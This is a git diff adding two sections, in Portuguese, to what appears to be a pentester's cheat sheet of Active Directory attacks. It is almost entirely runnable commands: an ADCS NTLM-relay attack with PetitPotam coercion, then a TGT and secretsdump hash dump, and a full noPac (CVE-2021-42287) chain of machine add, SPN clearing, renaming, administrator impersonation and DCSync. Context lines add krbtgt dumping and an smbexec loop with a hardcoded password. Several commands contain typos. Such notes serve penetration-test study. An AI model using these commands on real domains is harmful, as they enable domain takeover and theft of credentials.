@@ -9163,6 +9163,43 @@ Gerar arquivo Criptografado com tipo de imagem para o pentest
     export KRB5CCNAME='/Path/fake_user.ccache'
     secretsdump.py -k dc01.floripa.local -just-dc-ntlm -just-dc-user krbtgt
 
+`Ataques a Certificados Active Directory AD` REQUISITO É ACHAR A WEB RODANDO O CERTFNSH FAZER UM MAN IN THE MIDDLE PARA PEGAR AS HASHES E USUARIOS SEM CREDS VALIDAS
+
+	TERMINAL 1: impacket-ntlmrelay -t http:/192.168.161.210/certsrv/certfnsh.asp -smb2support --adcs --template DomainController -ip atacanteIP
+	TERMINAL 2: petitPotam.py IP-Atacante costao.brava.local && echo "VAI GERAR UM CERTIFICADO NO TERMINAL 1 E SALVA: nano cert-gerado-pelo-impackt.b54"
+	TERMINAL 3: gettgtpkinit.py -pfx-base64$(cat /home/kali/cert-gerado-pelo-impackt.b54) 'brava.local'/'costao$' '/tmp/costao.ccache' && echo "VAI GERAR O TGT EM TMP "
+	TERMINAL 4: cd /opt/PKINITtools && export KRBCCNAME=/tmp/costao.ccache
+	TERMINAL 5: impacket-secretsdump -k -no-pass BRAVA.LOCAL/'costao$'@costao.brava.local
+
+`Ataque CVE 202142287` Precisa de COTAS de inserção de maquinas e Credenciais Bypass PAC (PAC tem infos de infos de users) Verificar cotas -> add PC -> limpar SPN -> Rename PC p/ nome AD -> Obter TGT -> voltar hostname original -> obter TGS -> dcsync
+
+	PREPARANDO O AMBIENTE
+	git clone https://github.com/fortra/impacket
+	cd impacket
+	git checkout-b mydev
+	python3 -m venv devimpacket
+	source devimpacket/bin/activate
+	python3 -m pip install.
+	git fetch origin pull/1224/head:1224
+	git fetch origin pull/1202/head:1202
+	git merge 1202
+	git merge 1224
+	rehash
+	git clone https://github.com/dirkjanm/krbrelayx
+	DONE
+	VERIFICAR COTAS: crackmapexe ldap ingleses,praias.floripa.local -u usuario -p senha -d praias.floripa.local -M MAQ && echo "Vai aparecer a quantidade de COTAS"
+	ADD COMPUTER: impacket-addcomputer -computer-name 'pc3$' -computer-pass 'ComputerPassword' -dc-host ingleses.praias.floripa.local -domain-netbios PRAIAS 'ingleses.praias.floripa.local/user:pass'
+	cd krbrelayx
+	LIMPAR SPN: python3 addspn.py --clear -t 'pc3$' -u 'praias.floripa.local\usuario' -p 'senha' 'ingleses.praias.floripa.local'
+	cd ../examples
+	RENOMEAR PC: python3 renameMachine.py -current-name 'PC3$' -new-name 'ingleses' -dc-ip 'ingleses.floripa.local' praias.floripa.local/usuario:senha
+	GET TGT: python3 getTGT.py -dc-ip 'ingleses.praias.floripa.local' 'praias.floripa.local'/'ingleses':'butterfly
+	RENOMEAR PC:python3 renameMachine.py -current-name 'ingleses' -new-name 'pc3$' praias.floripa.local/neuzilene:butterfly
+	GET TGS export KRB5CCNAME=ingleses.ccache;
+	python3 getST.py -self -impersonate 'administrator'-altservice 'CIFS/ingleses.praias.floripa.local'-k -no-pass -dc-ip 'ingleses.praias.floripa.local' 'praias.floripa.local' /'ingleses' -debug
+	DCSYNC: export KRB5CCNAME=administrator@CIFS_ingleses.praias.floripa.local@PRAIAS.FLORIPA. LOCAL.ccache
+	python3 secretsdump.py -k -no-pass -dc-ip 'ingleses.praias.floripa.local'@'ingleses.praias.floripa.local
+
 ATAQUES GERAIS AO SMB
 
 	for i in {100,110,120.220,230};do impacket-smbexec praias/sampaio:sexywolfy@192.168.161.$i ;done
